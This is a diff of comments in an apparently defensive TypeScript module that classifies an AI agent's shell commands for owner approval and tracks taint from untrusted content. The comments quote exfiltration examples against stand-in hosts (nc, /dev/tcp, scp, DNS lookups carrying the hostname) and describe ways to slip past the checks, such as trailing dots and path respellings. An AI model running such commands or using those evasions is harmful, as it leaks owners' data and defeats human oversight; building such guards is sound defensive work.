@@ -2,13 +2,13 @@
  * What a command is, read off the invocation: what it runs, where it writes, what it reaches, and
  * whether what came back is the owner's own bytes or somebody else's.
  *
- * Lifted out of tools.ts unchanged. Every classifier here answers a question about one `shell`
- * call - or about a script that call hands to an interpreter - and the whole point of keeping them
- * in one file is that they must agree with each other: `commandScript` is the single reader of
- * where a script was written down, and a classifier that reads `args` alone instead is exactly how
- * `stdin` walked past all of them at once.
+ * Every classifier here answers a question about one `shell` call - or about a script that call
+ * hands to an interpreter - and the whole point of keeping them in one file is that they must agree
+ * with each other: `commandScript` is the single reader of where a script was written down, and a
+ * classifier that reads `args` alone instead lets a script sent on `stdin` walk past all of them at
+ * once.
  *
- * `tools.ts` re-exports what it always exported, so no caller moved.
+ * `tools.ts` re-exports these for its callers.
  *
  * The download-quarantine trio sits here rather than with the write classifiers because
  * `untrustedShellOrigin` reads it: a `cat workspace/downloads/terms.txt` is a tainted read, and
@@ -25,15 +25,12 @@ import { textValue } from './values.js';
  * Whether the bytes an address hands back were written on somebody else's computer.
  *
  * The PROVENANCE question, and deliberately not the egress question `classifyDestination` answers.
- * The two were the same call here and that is what broke: this asked `classifyDestination(...).sink`,
- * which is `isPublicHttpUrl`, which is false for loopback and equally false for all of RFC1918,
- * link-local, `*.local`, `*.internal`, `*.home.arpa` and `metadata.google.internal`. So
- * `curl -s http://wiki.internal/runbook` and `curl -s http://169.254.169.254/latest/meta-data/`
- * came back clean: a page off the estate LAN and the cloud metadata service are both somebody
- * else's bytes, and a turn that read them went on to write the brief, nominate memory and fetch
- * outward with the floor still reporting it clean. Measured against `fb93b40` on nine such
- * addresses: all nine tainted there, none tainted here, and in BOTH spellings - so the "the silent
- * spelling was already free" bound that covers the rest of this change did not cover this clause.
+ * Its `.sink` is `isPublicHttpUrl`, which is false for loopback and equally false for all of
+ * RFC1918, link-local, `*.local`, `*.internal`, `*.home.arpa` and `metadata.google.internal`. Asked
+ * here, it would read `curl -s http://wiki.internal/runbook` and
+ * `curl -s http://169.254.169.254/latest/meta-data/` as clean: a page off the estate LAN and the
+ * cloud metadata service are both somebody else's bytes, and a turn that read them would go on to
+ * write the brief, nominate memory and fetch outward with the floor still reporting it clean.
  *
  * The two questions differ because they are asked in opposite directions. Somewhere data cannot go
  * is a large set, and being generous with it loses nothing. Somewhere trustworthy bytes come FROM
@@ -44,12 +41,12 @@ import { textValue } from './values.js';
  * fails open, and this one fails closed.
  *
  * What it keeps is the reason a destination test was wanted at all. A health check against the dev
- * server this turn just started reads this computer's own output, and calling that hostile marked
- * the rest of the turn on the strength of the harness's own bytes. `http://localhost:5173/api/health`
- * and `http://127.0.0.1:8080/` stay clean, and the owner's one-shot scenario ends on exactly that
- * call. Measured: narrowing this from the private ranges to loopback moves no card in any mode on
- * any of the fourteen scenarios - the turn is already tainted by `npm install` long before the
- * health check, so the private ranges were never buying a card, only losing stops.
+ * server this turn just started reads this computer's own output, and calling that hostile would
+ * mark the rest of the turn on the strength of the harness's own bytes.
+ * `http://localhost:5173/api/health` and `http://127.0.0.1:8080/` stay clean, and the owner's
+ * one-shot scenario ends on exactly that call. Clearing the private ranges as well would lose
+ * stops and spare no card: the turn is already tainted by `npm install` long before the health
+ * check.
  *
  * No self-origin argument, because no caller has one: the taint reader is handed `args` and
  * nothing else. A read of this box's own published preview therefore taints, which is the
@@ -193,18 +190,18 @@ export const consequentialExecutables = new Set([
 ]);
 
 /**
- * Signalling a process, which is not destroying data and used to be filed as though it were.
+ * Signalling a process, which is not destroying data.
  *
- * `kill`, `killall` and `pkill` sat in the set above beside `rm` and `dd`. Measured through the
- * shipped `approvalRequirement` at bfbbd00, `kill -0 1234` - a liveness probe that sends no signal
- * at all - `pkill -f vite` and `killall node` each stopped the turn in ALL THREE modes under a
- * preview reading "This can remove or overwrite data", which is false of every one of them.
- * Stopping the dev server this agent started two calls earlier is ordinary work, and a card in
- * front of ordinary work is a card the owner learns to tap through.
+ * `kill`, `killall` and `pkill` are kept out of the set above. Filed beside `rm` and `dd`,
+ * `kill -0 1234` - a liveness probe that sends no signal at all - `pkill -f vite` and
+ * `killall node` would each stop the turn in all three modes under a preview reading "This can
+ * remove or overwrite data", which is false of every one of them. Stopping the dev server this
+ * agent started two calls earlier is ordinary work, and a card in front of ordinary work is a card
+ * the owner learns to tap through.
  *
- * They are named here rather than simply deleted, because `placeableExecutable` is the list of
- * words this file can NAME and the publish walk reads straight past a word it cannot place:
- * dropping the three outright would have made `pkill -f "npm publish"` read on to `npm`.
+ * They are named here rather than left out, because `placeableExecutable` is the list of words
+ * this file can NAME and the publish walk reads straight past a word it cannot place: leaving the
+ * three out would make `pkill -f "npm publish"` read on to `npm`.
  *
  * What signalling can still do to this computer is held by `signalStopsThisComputer` below instead,
  * because it is a property of the target and not of the program.
@@ -758,12 +755,12 @@ const escapingRedirect = (body: string): boolean => {
 /**
  * A delete written through a language runtime, whoever the receiver happens to be called.
  *
- * This used to require the literal text `fs.`, so `require('fs').rmSync('/home/garden')` and the
- * same call through any local name went through with no card at all - while `rm -f` on the
- * workspace's own scratch directory stopped the task. The control refused the honest phrasing and
- * missed the evasive one. Matching the method rather than the receiver closes that, and these
- * names are specific enough not to catch ordinary code: `remove` on its own is not among them,
- * because every list in every language has one.
+ * Requiring the literal text `fs.` would let `require('fs').rmSync('/home/garden')` and the same
+ * call through any local name through with no card at all - while `rm -f` on the workspace's own
+ * scratch directory stops the task. That control would refuse the honest phrasing and miss the
+ * evasive one. Matching the method rather than the receiver closes that, and these names are
+ * specific enough not to catch ordinary code: `remove` on its own is not among them, because every
+ * list in every language has one.
  */
 const DESTRUCTIVE_RUNTIME_CALL =
   /\.(?:rm|rmSync|rmdir|rmdirSync|unlink|unlinkSync|rmtree|removedirs)\s*\(/;
@@ -1566,20 +1563,19 @@ const RUNTIME_WRITE_CALL =
 /**
  * The paths a `shell` call can be *shown* to write, or null when it cannot be shown at all.
  *
- * `writtenPaths` used to hand its two callers every whitespace-and-punctuation token in the script,
- * which made `bash -lc 'cat ~/.bashrc'` raise "Change a file this computer runs on its own" - a
- * read carded as a write, in the product's most alarming class. The bare `cat` raised nothing, so
- * the classification rewarded whichever phrasing the model happened to reach for, and
+ * Handing the two callers every whitespace-and-punctuation token in the script would make
+ * `bash -lc 'cat ~/.bashrc'` raise "Change a file this computer runs on its own" - a read carded as
+ * a write, in the product's most alarming class - while the bare `cat` raises nothing, so the
+ * classification would reward whichever phrasing the model happened to reach for, and
  * `tool-catalogue.ts` tells it to reach for the wrapped one the moment it needs a pipe, a glob or a
- * redirect. Measured on the owner-shaped "why is my PATH wrong" task: seven cards in nine calls,
- * six of them on commands that changed nothing. A floor the owner taps through is not a floor.
+ * redirect. A floor the owner taps through is not a floor.
  *
  * So the write targets are resolved instead: what a redirect points at, and the arguments of a
- * command this file recognises as a writer. The fail-closed property is kept whole and moved rather
- * than dropped - the moment any command in the script is one this cannot place on either side, the
- * answer is null and the caller goes back to the wide net. That fallback costs nothing except where
- * the script also names one of the few paths the deferred-execution rule watches, and the commands
- * that name one of those while only reading it are exactly the ones enumerated above.
+ * command this file recognises as a writer. The fail-closed property is kept whole - the moment any
+ * command in the script is one this cannot place on either side, the answer is null and the caller
+ * goes back to the wide net. That fallback costs nothing except where the script also names one of
+ * the few paths the deferred-execution rule watches, and the commands that name one of those while
+ * only reading it are exactly the ones enumerated above.
  */
 export const shellWriteTargets = (args: Record<string, unknown>): string[] | null => {
   const script = commandScript(args);
@@ -1706,22 +1702,17 @@ export const CHECKPOINT_CONTENT: readonly (readonly string[])[] = [
  * `CheckpointRefusedError` and costs the turn the very undo point this whole rule is written
  * against.
  *
- * This function read `~` as the root ITSELF, which was true while `HOME` was `workspaceRoot` and
- * became a live hole the moment it stopped being. Measured through the shipped
- * `approvalRequirement` in autonomous with `~` read as the root: `rm -rf ~/workspace/dist` and
- * `rm -rf ~/.garden/artifacts/a.png` both raised NO card, because they resolved to
- * `<root>/workspace/dist` and `<root>/.garden/artifacts/a.png` and answered "inside the
- * checkpoint" - while what they actually delete is `<root>/.home/workspace/dist` and
- * `<root>/.home/.garden/artifacts/a.png`, which no rewind walks and nothing puts back. Both card
- * again with the segment in front. Nothing was freed by adding it: `~/.ssh` and `~/.cargo/registry`
- * were outside the checkpoint under either reading, and `~/../workspace/dist` - which used to climb
- * out of the root and answer null - now resolves to the real `workspace/dist` and is correctly
- * free.
+ * Reading `~` as the root ITSELF would be a live hole: `rm -rf ~/workspace/dist` and
+ * `rm -rf ~/.garden/artifacts/a.png` would resolve to `<root>/workspace/dist` and
+ * `<root>/.garden/artifacts/a.png` and answer "inside the checkpoint" with no card - while what
+ * they actually delete is `<root>/.home/workspace/dist` and `<root>/.home/.garden/artifacts/a.png`,
+ * which no rewind walks and nothing puts back. With the segment in front both card. Nothing is
+ * freed by it: `~/.ssh` and `~/.cargo/registry` are outside the checkpoint under either reading,
+ * and `~/../workspace/dist` resolves to the real `workspace/dist` and is correctly free.
  *
  * One segment, spelled the way everything else here is spelled, relative to the workspace root.
  * `command-classification.test.ts` pins it against `AGENT_HOME` in the runner's own source, so a
- * later move of `$HOME` fails there rather than quietly freeing a delete here - which is exactly
- * how this defect arrived.
+ * later move of `$HOME` fails there rather than quietly freeing a delete here.
  */
 export const AGENT_HOME: readonly string[] = ['.home'];
 
@@ -2114,16 +2105,15 @@ export const removalTargets = (
  *
  * Three option pairs below differ only in case. curl's `-T` uploads a file and `-t` sets a telnet
  * option; `-X` chooses the method and `-x` names a proxy; gh's `-f` and `-F` both write a field,
- * and `-F` will read its value out of a file. Every list here used to be matched against
- * lowercased arguments, so each pair collapsed into whichever spelling happened to be written
- * down - and the gh list was `['-f','--raw-field','-f','--field','--input']`, with `-f` twice and
- * `-F` absent. It was safe by accident: the collapse always erred towards raising the card, and
- * `-F` was caught only because it arrived as `-f`. The repair that looks obvious - match the raw
- * argument against the same list - would have let `gh api -F key=@file` through as a read.
+ * and `-F` will read its value out of a file. Matching every list against lowercased arguments
+ * would collapse each pair into whichever spelling happened to be written down; matching the raw
+ * argument against a list that names only the lowercase spelling would let `gh api -F key=@file`
+ * through as a read.
  *
- * It also cost precision in the other direction: `curl -D headers.txt https://x` is an ordinary
- * GET that writes the response headers to a local file, and it asked the owner to approve an
- * upload. A card in front of a plain fetch is a card the owner learns to tap through.
+ * Lowercasing also costs precision in the other direction: `curl -D headers.txt https://x` is an
+ * ordinary GET that writes the response headers to a local file, and read as `-d` it asks the
+ * owner to approve an upload. A card in front of a plain fetch is a card the owner learns to tap
+ * through.
  *
  * So the short forms are enumerated by case and compared raw. The long forms stay
  * case-insensitive, deliberately: no tool here spells a long option with a capital, so lowercasing
@@ -2198,13 +2188,13 @@ export const sendsDataOverNetwork = (executable: string, commandArgs: string[]):
  * Changing what the public can install, by package manager and by operation.
  *
  * `safeNetworkExecutables` is an allowlist of *executables*, so the allowance written for
- * `npm install` carried `npm publish` with it. `curl` and `git` had operation checks bolted on -
- * `sendsDataOverNetwork` above reads curl's upload options, `gitSubcommand` below reads `push` - and
- * the package managers never got one. Measured on the shipped floor before this existed:
- * `npm publish`, `pnpm publish`, `yarn publish`, `cargo publish`, `twine upload`, `gem push`,
- * `poetry publish`, `dotnet nuget push`, `mvn deploy` and `docker push` raised no card in balanced
- * OR autonomous, while `rm -rf node_modules` stopped the turn in all three - and the resident
- * contract told the owner that public publishing always stops.
+ * `npm install` would carry `npm publish` with it. `curl` and `git` have their own operation
+ * checks: `sendsDataOverNetwork` above reads curl's upload options and `gitSubcommand` below reads
+ * `push`, and this is the package managers' one. Without it `npm publish`, `pnpm publish`,
+ * `yarn publish`, `cargo publish`, `twine upload`, `gem push`, `poetry publish`,
+ * `dotnet nuget push`, `mvn deploy` and `docker push` would raise no card in balanced or
+ * autonomous, while `rm -rf node_modules` stops the turn in all three - and the resident contract
+ * tells the owner that public publishing always stops.
  *
  * ONE ACT, not one direction: a version that goes to a registry cannot be withdrawn (npm's own
  * unpublish window is 72 hours and crates.io has none at all), and the operations that take one
@@ -2215,14 +2205,13 @@ export const sendsDataOverNetwork = (executable: string, commandArgs: string[]):
  * other than the owner and none of them is inside the checkpoint, which is the two-part test the
  * floor's other consequential cards are drawn from.
  *
- * An OPERATION table rather than an executable list, so the shape that produced the miss cannot
- * repeat: adding a package manager to `safeNetworkExecutables` no longer silently allows its
- * publish. What it does not do is invert the default - a subcommand nobody has judged still passes,
- * because the alternative was measured and is not shippable: npm alone has fifty-odd subcommands
- * plus `npm run <anything>`, so an allowlist of safe ones cards `npm ls`, `npm outdated` and
- * `npm whoami`, which is a card on reading. The narrower claim this table makes is the one that can
- * be held: every operation that changes what the public can install is named, and a new one has to
- * be added here.
+ * An OPERATION table rather than an executable list, so adding a package manager to
+ * `safeNetworkExecutables` does not silently allow its publish. What it does not do is invert the
+ * default - a subcommand nobody has judged still passes, because the alternative is not shippable:
+ * npm alone has fifty-odd subcommands plus `npm run <anything>`, so an allowlist of safe ones cards
+ * `npm ls`, `npm outdated` and `npm whoami`, which is a card on reading. The narrower claim this
+ * table makes is the one that can be held: every operation that changes what the public can install
+ * is named, and a new one has to be added here.
  *
  * `yarn npm publish` is Berry's spelling and `dotnet nuget push` is dotnet's, so an operation may be
  * two words, matched as a run rather than at a fixed position: `mvn clean deploy` and
@@ -2375,14 +2364,13 @@ export const registryPublishOperation = (
 /**
  * Putting something where other people can reach it, by a route that is not a package registry.
  *
- * The owner named "publishing anything online" as a thing that must always stop, and until this
- * table the floor's whole answer to it was `git push`, `publish_site` and the registry rule above.
- * Measured on this tree before the change, in balanced AND autonomous: `vercel --prod`,
- * `vercel deploy --prod`, `flyctl deploy`, `netlify deploy --prod`, `wrangler publish`,
- * `wrangler deploy`, `kubectl apply -f k8s.yaml`, `gcloud app deploy`, `terraform apply` and
- * `firebase deploy` raised NOTHING. Two of the brief's seven already stopped and are left where
- * they are rather than duplicated: `gh release create` raised "Send data using gh" and
- * `aws s3 sync ./dist s3://bucket` raised "Allow internet access", both `external_reversible`; the
+ * The owner named "publishing anything online" as a thing that must always stop, and without this
+ * table the floor's whole answer to it would be `git push`, `publish_site` and the registry rule
+ * above: `vercel --prod`, `vercel deploy --prod`, `flyctl deploy`, `netlify deploy --prod`,
+ * `wrangler publish`, `wrangler deploy`, `kubectl apply -f k8s.yaml`, `gcloud app deploy`,
+ * `terraform apply` and `firebase deploy` would raise NOTHING in balanced or autonomous. Two routes
+ * stop elsewhere and are not duplicated: `gh release create` raises "Send data using gh" and
+ * `aws s3 sync ./dist s3://bucket` raises "Allow internet access", both `external_reversible`; the
  * gh entry below promotes the first to the consequential card that says what it is, and the second
  * keeps the card it has.
  *
@@ -2556,8 +2544,9 @@ export const deploymentOperation = (
    *
    * The bare arm below is the weakest evidence in this file - a name and no operation at all - and
    * the walk that reads past unnamed words hands it every word of every command. `hash vercel`,
-   * which asks the shell to remember where vercel is, came back as "Publish online with vercel" in
-   * all three modes on that route. A bare name is only a deployment when nothing else was asked.
+   * which asks the shell to remember where vercel is, would otherwise read as "Publish online with
+   * vercel" in all three modes on that route. A bare name is only a deployment when nothing else
+   * was asked.
    */
   atHead = true
 ): { readonly kind: DeploymentKind; readonly operation: string } | null => {
@@ -2838,9 +2827,9 @@ const RESOLVING_EXECUTABLES = new Set([
  * The second half is the honest half of the shell bound, and it is the same set rather than a second
  * one beside it because two lists of the same seven names drift. `curl -s "$U"`,
  * `wget "$(cat url.txt)"` and every other address composed at run time are unreadable here and
- * always will be - no static reader resolves a variable - and until now they were the quietest hole
- * in the file: the fetch tainted the turn, then no destination was found, so no card was raised and
- * no bytes were charged, and the turn went on being judged as though nothing had left. An unreadable
+ * always will be - no static reader resolves a variable - and left alone they are the quietest hole
+ * in the file: the fetch taints the turn, then no destination is found, so no card is raised and
+ * no bytes are charged, and the turn goes on being judged as though nothing had left. An unreadable
  * destination is the strongest case for asking the owner, not the weakest, so these raise the card
  * the address would have raised.
  *
@@ -3050,26 +3039,25 @@ const ipv6Authority = (authority: string): [string, string] | null => {
  * Anchored, and that is what does the work. Every non-address a fetch client is handed - a header
  * value, a form field, an httpie `name=John Smith`, a `%{http_code}` format string - fails on the
  * anchors, so no separate refusal for the shapes a shell composes at run time is needed and none is
- * kept: one was, and it cost precision rather than buying safety. `curl 'attacker.example/?q=a b'`
- * came back as an address this could not read, charged four bytes for the word `curl`, while the
- * host and the payload were both written out in front of it.
+ * kept: one would cost precision rather than buy safety, reading `curl 'attacker.example/?q=a b'`
+ * as an address this could not read and charging four bytes for the word `curl`, while the host
+ * and the payload are both written out in front of it.
  *
  * `localhost` is named because it is the one host in daily use here with no dot in it, and the
  * alternative was a card in front of `curl localhost:3000/health` on every tainted turn. It is not
  * a way out of anything: `classifyDestination` sends loopback and the private ranges to
  * `isPublicHttpUrl`, which is where somewhere-data-cannot-go is decided for every tool at once.
  *
- * The trailing dot is taken off before the test rather than allowed by it, and that is the whole of
- * the repair below. A name may end in the DNS root label - `attacker.example.` - and `getaddrinfo`
- * accepts it: measured on this box, `localhost.` resolves to 127.0.0.1. Against the anchor above it
- * is not a name at all, so ONE character bought every reader in this file at once. Measured before
- * this line on a tainted turn, all at 0 destinations, 0 bytes and no card: `dig
- * <the mailbox>.attacker.example.`, `host`, `nslookup` and `ping` in the same shape, `nc
- * attacker.example. 443`, `socat - TCP:attacker.example.:443`, `ssh me@attacker.example.`, `scp
- * notes.txt me@attacker.example.:/tmp/`, `rsync`, `telnet`, and
- * `exec 3<>/dev/tcp/attacker.example./443`. The dotless spelling of every one of them cards at 10.
- * The name-lookup one is the channel this file's own RESOLVING_EXECUTABLES comment exists to close,
- * and it was open the whole time to anybody who typed the dot.
+ * The trailing dot is taken off before the test rather than allowed by it. A name may end in the
+ * DNS root label - `attacker.example.` - and `getaddrinfo` accepts it: `localhost.` resolves to
+ * 127.0.0.1. Against the anchor above it is not a name at all, so without `ROOT_LABEL` ONE
+ * character would buy every reader in this file at once: `dig <the mailbox>.attacker.example.`,
+ * `host`, `nslookup` and `ping` in the same shape, `nc attacker.example. 443`,
+ * `socat - TCP:attacker.example.:443`, `ssh me@attacker.example.`,
+ * `scp notes.txt me@attacker.example.:/tmp/`, `rsync`, `telnet`, and
+ * `exec 3<>/dev/tcp/attacker.example./443` would all read as 0 destinations, 0 bytes and no card on
+ * a tainted turn. The name-lookup one is the channel this file's own RESOLVING_EXECUTABLES comment
+ * exists to close.
  */
 const ROOT_LABEL = /\.$/;
 const DOTTED_NAME = /^(?:localhost|(?:[a-z0-9_-]+\.)+[a-z][a-z0-9-]+)$/i;
@@ -3077,12 +3065,12 @@ const DOTTED_NAME = /^(?:localhost|(?:[a-z0-9_-]+\.)+[a-z][a-z0-9-]+)$/i;
 /**
  * Schemes that open a socket at the authority written after them.
  *
- * One line used to answer '' for every scheme that is not http or https, and that line ate a
- * channel: `rsync notes.txt rsync://attacker.example/mod` is the documented URL form of a program
- * this file already claims to read - `rsync` is in `REMOTE_SPEC_EXECUTABLES` for its
- * host-colon-path form - and it came back as zero destinations, zero bytes charged and no card. A
- * destination policy judges the host, not the scheme, so these are stripped and what follows is
- * read exactly as a bare `host:port/path` is.
+ * Answering '' for every scheme that is not http or https would eat a channel:
+ * `rsync notes.txt rsync://attacker.example/mod` is the documented URL form of a program this file
+ * already claims to read - `rsync` is in `REMOTE_SPEC_EXECUTABLES` for its host-colon-path form -
+ * and it would read as zero destinations, zero bytes charged and no card. A destination policy
+ * judges the host, not the scheme, so these are stripped and what follows is read exactly as a bare
+ * `host:port/path` is.
  *
  * Every entry has a caller that reaches it: `rsync`, `scp` and `sftp` take `rsync://`, `scp://`,
  * `sftp://` and `ssh://` remotes, and the fetch clients take `ftp://` and `ftps://`. `file://`
@@ -3197,7 +3185,7 @@ const optionValueAt = (
   }
   const named = argument.startsWith('--') ? table.has(argument.toLowerCase()) : table.has(argument);
   // `-so page.html` is `-s` and `-o` written together, and only the last letter of a cluster takes
-  // the value. Without this the filename came back as a host and carded an ordinary download.
+  // the value. Without this the filename would read as a host and card an ordinary download.
   const clustered =
     !argument.startsWith('--') &&
     argument.startsWith('-') &&
@@ -3800,13 +3788,13 @@ export const callDestinations = (name: string, args: Record<string, unknown>): s
 /**
  * A command that always writes its far end down, and wrote nothing this could read.
  *
- * The third answer the network arm needs, and the one the flag used to give by accident.
- * `dig $(cat /etc/hostname).collector.invalid` is a name lookup carrying the box's hostname to a
- * host nobody named - the classic DNS channel out - and `scriptCommands` splits the command
+ * The third answer the network arm needs, and not one the model's `network` flag can be trusted to
+ * give. `dig $(cat /etc/hostname).collector.invalid` is a name lookup carrying the box's hostname
+ * to a host nobody named - the classic DNS channel out - and `scriptCommands` splits the command
  * substitution off, so `dig` arrives here with no operand at all and `commandAddresses` reports no
- * destination. Before the repair the arm carded it, but only incidentally: the `$(` split leaves a
- * segment beginning `cat`, `cat` is not on the allowlist, and the arm was open because the model had
- * ticked `network`. Omit the flag and the same lookup was free.
+ * destination. Keyed on the flag, the arm would card it only incidentally - the `$(` split leaves a
+ * segment beginning `cat`, and `cat` is not on the allowlist - and with the flag omitted the same
+ * lookup would be free.
  *
  * So the arm asks this instead. A client whose whole grammar is "here is where to connect" -
  * `curl`, `ssh`, `rsync`, `dig`, `aws s3`, `openssl s_client` - that named nothing readable is a
@@ -3907,18 +3895,17 @@ export const outboundDestinations = (
     /*
      * The internet only, said out loud rather than inherited.
      *
-     * `verdict.sink` used to mean the internet by accident: `classifyDestination` cleared every
-     * private, link-local and `*.internal` address before it judged anything, so a filter on `sink`
-     * and a filter on "leaves for the internet" were the same filter. They are not any more - the
-     * estate is charged and judged there now - and the difference lands here, on the arm that
-     * decides whether BALANCED asks about a command on a clean turn.
+     * A filter on `verdict.sink` is not a filter on "leaves for the internet":
+     * `classifyDestination` charges and judges the estate - private, link-local and `*.internal`
+     * addresses - as well, and the difference lands here, on the arm that decides whether BALANCED
+     * asks about a command on a clean turn.
      *
-     * Kept narrow on purpose, so that this change moves no card on a turn nothing hostile has been
-     * read in. The provenance floor reads `classifyDestination` directly and does gate the estate,
+     * Kept narrow on purpose, so that a turn nothing hostile has been read in is not carded for the
+     * estate. The provenance floor reads `classifyDestination` directly and does gate the estate,
      * which is where a bound can be argued from evidence; widening THIS line would card a
      * self-hosted owner's ordinary traffic to their own NAS in balanced mode, and that is a
      * judgement about how often that happens rather than a bound anything here enforces. It is one
-     * clause, and a wave that can measure it can delete it - see docs/design/gaps/NETWORK.md.
+     * clause, and whoever can measure it can delete it - see docs/design/gaps/NETWORK.md.
      */
     .filter(({ verdict }) => verdict.sink && verdict.reach === 'internet')
     .map(({ address, verdict }) => ({ address, host: verdict.host }));
@@ -4101,15 +4088,14 @@ export const DOWNLOAD_QUARANTINE_PREFIXES = [
 /*
  * A workspace path as the quarantine rule compares it.
  *
- * NORMALISED, not merely stripped, and that is the whole of this function. It used to be
- * `path.replace(/^\.?\//, '')` - leading `./` or `/` removed and nothing else - while the RUNNER
- * resolves the same string with `path.resolve` before opening it. So two spellings of one file
- * disagreed about whether reading it taints the turn, and the model chooses the spelling. Measured
- * against the shipped predicate: `workspace/downloads/inbound/a.json` was quarantined and
- * `workspace/./downloads/inbound/a.json` and `workspace//downloads/inbound/a.json` were not, while
- * all three open the same bytes. One inserted character bought a read of a stranger's file on a
- * turn the floor then judged clean - no egress charge, no card on a write to GARDEN.md, no card on
- * a read of any host.
+ * NORMALISED, not merely stripped, and that is the whole of this function. The RUNNER resolves the
+ * same string with `path.resolve` before opening it, so stripping a leading `./` or `/` and nothing
+ * else would let two spellings of one file disagree about whether reading it taints the turn, and
+ * the model chooses the spelling: `workspace/./downloads/inbound/a.json` and
+ * `workspace//downloads/inbound/a.json` open the same bytes as
+ * `workspace/downloads/inbound/a.json`. One inserted character would buy a read of a stranger's
+ * file on a turn the floor then judged clean - no egress charge, no card on a write to GARDEN.md,
+ * no card on a read of any host.
  *
  * `path.posix.normalize` is what the comparison needed and `path.resolve` is not: resolve would
  * anchor a relative path to this process's working directory, which is the worker's and not the
@@ -4164,46 +4150,42 @@ const NETWORK_CLIENT_EXECUTABLES = new Set([
  * Where the untrusted content in a `shell` result came from, or null when the command only touched
  * the owner's own computer.
  *
- * Two channels, both reachable by an attacker and neither of them labelled until now.
+ * Two channels, both reachable by an attacker.
  *
- * The first is the command that fetches. `network: true` was the whole test, and it is a
- * declaration rather than a gate: the installer ships the per-command namespace off, because a
- * command with its own loopback breaks published previews, so `curl https://attacker.example/brief`
- * reaches the internet whether or not the model ticked the box - and a model following an injected
- * instruction has every reason not to tick it. So the invocation is judged instead: a client whose
- * only job is to fetch, a git subcommand that talks to a remote, a package manager installing or
- * updating, or an http(s) address named anywhere in the command including inside an inline script.
- * The last one is what covers `python3 -c` and every interpreter after it without naming any of
- * them. What is deliberately not here is the rest of git, the rest of the package managers, and
- * every build and test command - `git status` and `pnpm test` read nothing from outside, and a
- * floor that rose on them would raise a card on the ordinary work and be tapped through.
+ * The first is the command that fetches. `network: true` is a declaration rather than a gate: the
+ * installer ships the per-command namespace off, because a command with its own loopback breaks
+ * published previews, so `curl https://attacker.example/brief` reaches the internet whether or not
+ * the model ticked the box - and a model following an injected instruction has every reason not to
+ * tick it. So the invocation is judged instead: a client whose only job is to fetch, a git
+ * subcommand that talks to a remote, a package manager installing or updating, or an http(s)
+ * address named anywhere in the command including inside an inline script. The last one is what
+ * covers `python3 -c` and every interpreter after it without naming any of them. What is
+ * deliberately not here is the rest of git, the rest of the package managers, and every build and
+ * test command - `git status` and `pnpm test` read nothing from outside, and a floor that rose on
+ * them would raise a card on the ordinary work and be tapped through.
  *
- * AND THE FLAG IS NO LONGER HERE AT ALL, which is the repair this comment used to describe half of.
- * It said the invocation is judged INSTEAD, and then went on testing `args.network === true` first,
- * so the declaration was still sufficient on its own: `npm run dev --network` marked the turn as
- * having read untrusted content, `npm run dev` without it did not, and the two commands run the
- * same program with the same access. The turn tainted itself installing its own dependencies -
- * measured on `L-no-research-build`, a build that reads nothing anybody else wrote, five cards in
- * autonomous against two for the same thirty-five calls with the field left out, the first of them
- * charged to the model for telling the truth about needing a registry, which the tool description
- * tells it to do. Taint now follows what was READ. `npm install` still taints, because it really
- * does fetch from a registry; `npm run dev` does not, because nothing came back that anyone else
- * wrote.
+ * AND THE FLAG IS NOT READ HERE AT ALL. Testing `args.network === true` first would make the
+ * declaration sufficient on its own: `npm run dev --network` would mark the turn as having read
+ * untrusted content, `npm run dev` without it would not, and the two commands run the same program
+ * with the same access - and the model would be charged a card for telling the truth about needing
+ * a registry, which the tool description tells it to do. Taint follows what was READ. `npm install`
+ * taints, because it really does fetch from a registry; `npm run dev` does not, because nothing
+ * came back that anyone else wrote.
  *
  * A fetch that names where it went is judged by where it went, and by LOOPBACK rather than by the
  * egress classifier's idea of a sink - see `readsAnotherComputer` for why those are opposite
- * questions and what asking the wrong one cost. `curl http://localhost:5173/health` reads this
- * computer's own dev server and a turn does not become untrusted by reading its own output; a read
- * of `http://wiki.internal/runbook` is somebody else's machine and taints. A fetch that names
+ * questions and what asking the wrong one would cost. `curl http://localhost:5173/health` reads
+ * this computer's own dev server and a turn does not become untrusted by reading its own output; a
+ * read of `http://wiki.internal/runbook` is somebody else's machine and taints. A fetch that names
  * nothing readable - `npm install`, `git pull`, `pip install`, whose remote lives in configuration
  * rather than in the command - still taints, because nothing here can say the bytes were the
  * owner's. And `curl -s "$U"` taints, because the operand it wrote and this could not read comes
- * back from `commandAddresses` as an address that will not parse, which `readsAnotherComputer` calls
- * another computer. Unreadable fails closed; cleared does not.
+ * back from `commandAddresses` as an address that will not parse, which `readsAnotherComputer`
+ * calls another computer. Unreadable fails closed; cleared does not.
  *
- * The second is the download directory. `file_read`, `document_read` and `image_read` have always
- * treated it as quarantine; `shell` did not, so `cat workspace/downloads/terms.txt` put the same
- * bytes into the same window with the floor still reporting the turn as clean.
+ * The second is the download directory. `file_read`, `document_read` and `image_read` treat it as
+ * quarantine, and `shell` must too, or `cat workspace/downloads/terms.txt` puts the same bytes into
+ * the same window with the floor still reporting the turn as clean.
  */
 /**
  * Whether one resolved command brings bytes back from outside this computer.
@@ -4276,14 +4258,15 @@ const fetchesRemoteContent = (command: readonly string[]): boolean => {
   /*
    * And then where it went, for the clients that write their far end down.
    *
-   * A command that named its destinations and named only loopback read this computer - loopback
-   * and not the private ranges, which are other people's machines. `curl http://localhost:5173/api/health` is the agent looking at
-   * the dev server it just started - the resident contract tells it to check - and calling that a
-   * read of untrusted content marked the rest of the turn as hostile on the strength of the
-   * harness's own output. Named nothing readable (`npm install`, `git pull`) still counts: the
-   * remote is in configuration and nothing here can say whose bytes came back. Named something
-   * unreadable (`curl -s "$U"`) counts too, because `commandAddresses` hands back the operand it
-   * could not read and `readsAnotherComputer` calls an address that will not parse somebody else's.
+   * A command that named its destinations and named only loopback read this computer - loopback and
+   * not the private ranges, which are other people's machines.
+   * `curl http://localhost:5173/api/health` is the agent looking at the dev server it just started,
+   * which the resident contract tells it to check, and calling that a read of untrusted content
+   * would mark the rest of the turn as hostile on the strength of the harness's own output. Named
+   * nothing readable (`npm install`, `git pull`) still counts: the remote is in configuration and
+   * nothing here can say whose bytes came back. Named something unreadable (`curl -s "$U"`) counts
+   * too, because `commandAddresses` hands back the operand it could not read and
+   * `readsAnotherComputer` calls an address that will not parse somebody else's.
    */
   return reaches && (!addresses.length || addresses.some(readsAnotherComputer));
 };
@@ -4293,16 +4276,17 @@ export const untrustedShellOrigin = (args: Record<string, unknown>): string | nu
   const script = commandScript(args);
   const commands = effectiveCommands(args);
   /*
-   * The invocation used to be judged at its outer executable, with a scan for a literal http(s)
-   * address as the only thing that reached inside a script. That scan is what made the hole look
